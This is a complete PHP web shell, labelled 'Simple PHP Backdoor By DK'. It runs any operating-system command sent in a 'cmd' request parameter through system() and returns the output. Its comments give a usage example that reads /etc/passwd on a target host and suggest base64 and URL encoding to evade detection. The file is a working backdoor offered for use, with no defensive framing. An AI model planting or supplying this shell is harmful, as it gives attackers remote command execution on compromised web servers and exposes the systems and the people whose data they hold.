<!-- Simple PHP Backdoor By DK (One-Liner Version) -->
<!-- Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd -->

<!-- Extra evasion tricks:
base64_decode($cmd) / base64_encode($cmd)
urlencode($cmd) / urldecode($cmd)
-->

<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
